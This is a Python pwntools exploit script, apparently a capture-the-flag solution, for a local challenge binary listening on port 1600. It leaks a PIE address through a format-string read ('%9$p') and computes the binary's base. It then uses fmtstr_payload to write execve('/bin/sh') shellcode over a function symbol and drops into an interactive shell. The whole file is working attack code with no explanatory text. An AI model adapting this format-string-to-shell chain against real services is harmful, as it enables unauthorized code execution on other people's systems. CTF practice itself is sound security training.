#!/usr/bin/env python3
from pwn import *
import ctypes

exe=ELF("./challenge/chall")
#exe = ELF("./out")


HOST, PORT = "localhost",1600

context.binary = exe

# Constants

GDBSCRIPT = '''\
'''
CHECKING = True

off = 36
dep = 0x140e
offset = 14

def main():
    global io
    io = conn()
    io.recv()
    io.sendline(b"1")
    io.recv()
    io.sendline(b"%9$p")
    io.recvuntil(b'Choice: ')
    io.sendline(b"2")
    res = int(io.recvline(),16)
    io.recvuntil(b'Choice: ')
    
    exe.address = leak(pack(res),dep,"pie",True)

    shellcode = asm(shellcraft.execve('/bin/sh\0'))
    payload = fmtstr_payload(offset,{exe.symbols['func']:shellcode},write_size='short')
    io.sendline(b'1')
    io.recv()
    io.send(payload)
    io.recvuntil(b'Choice: ')
    io.sendline(b'2')
    print(io.recv())
    io.sendline(b'3')
    io.interactive()

def leak(buf, offset, leaktype, verbose=False):
    verbose and log.info(f"buf: {buf}")
    leak_addr = unpack(buf.ljust(context.bytes, b"\x00"))
    base_addr = leak_addr - offset
    verbose and log.info(f"{leaktype} leak: {leak_addr:#x}")
    log.success(f"{leaktype} base address: {base_addr:#x}")
    return base_addr

def stop():
    io.interactive()
    io.close()
    exit(1)

def check(predicate, disabled=False):
    if not disabled and CHECKING:
        assert(predicate)

def conn():
    if args.REMOTE:
        p = remote(HOST, PORT)
    elif args.GDB:
        p = gdb.debug(exe.path, gdbscript=GDBSCRIPT)
    else:
        p = process(exe.path)

    return p

if __name__ == "__main__":
    io = None
    try:
        main()
    finally:
        if io:
            io.close()





